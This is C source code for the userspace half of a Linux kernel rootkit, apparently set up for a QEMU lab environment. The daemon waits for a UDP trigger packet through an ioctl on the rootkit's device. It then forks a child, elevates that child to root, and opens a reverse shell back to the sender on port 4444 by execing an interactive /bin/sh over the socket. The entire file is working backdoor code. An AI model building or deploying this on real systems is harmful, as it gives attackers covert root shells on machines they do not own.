#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include "interface.h"

int main(int argc, char *argv[]) {
    const char *remote_ip_str = (argc >= 2) ? argv[1] : "10.0.2.2";

    /* Prevent terminated shell children from becoming zombies */
    signal(SIGCHLD, SIG_IGN);

    int dev_fd = open("/dev/" rootkit_DEV_NAME, O_RDWR);
    if (dev_fd < 0) {
        perror("open /dev/" rootkit_DEV_NAME);
        return 1;
    }

    /* Daemon loop: handles multiple triggers indefinitely */
    while (1) {
        struct in_addr remote_ip;
        memset(&remote_ip, 0, sizeof(remote_ip));

        /* Wait in kernel space until UDP trigger packet arrives */
        if (ioctl(dev_fd, rootkit_IOCTL_WAIT_REMOTE, &remote_ip) < 0) {
            sleep(1);
            continue;
        }

        pid_t pid = fork();
        if (pid < 0) {
            continue;
        }

        if (pid == 0) {
            /* ================= CHILD PROCESS ================= */
            /* Elevate child process credentials to root */
            if (ioctl(dev_fd, rootkit_IOCTL_ELEVATE, 0) < 0) {
                perror("ioctl rootkit_IOCTL_ELEVATE");
                close(dev_fd);
                exit(1);
            }
            close(dev_fd);

            /* If trigger came from QEMU host forwarder (0.0.0.0), resolve to host gateway */
            if (remote_ip.s_addr == INADDR_ANY) {
                inet_pton(AF_INET, remote_ip_str, &remote_ip);
            }

            int sock = socket(AF_INET, SOCK_STREAM, 0);
            if (sock < 0) exit(1);

            struct sockaddr_in sa;
            memset(&sa, 0, sizeof(sa));
            sa.sin_family = AF_INET;
            sa.sin_port = htons(4444);
            sa.sin_addr = remote_ip;

            if (connect(sock, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
                close(sock);
                exit(1);
            }

            dup2(sock, 0);
            dup2(sock, 1);
            dup2(sock, 2);

            char *argv[] = { "/bin/sh", "-i", NULL };
            char *envp[] = { "PATH=/sbin:/bin:/usr/sbin:/usr/bin", "TERM=xterm", NULL };
            execve("/bin/sh", argv, envp);

            close(sock);
            exit(0);
        }

        /* ================= PARENT PROCESS ================= */
        /* Loops back to wait for the next trigger packet */
    }

    close(dev_fd);
    return 0;
}
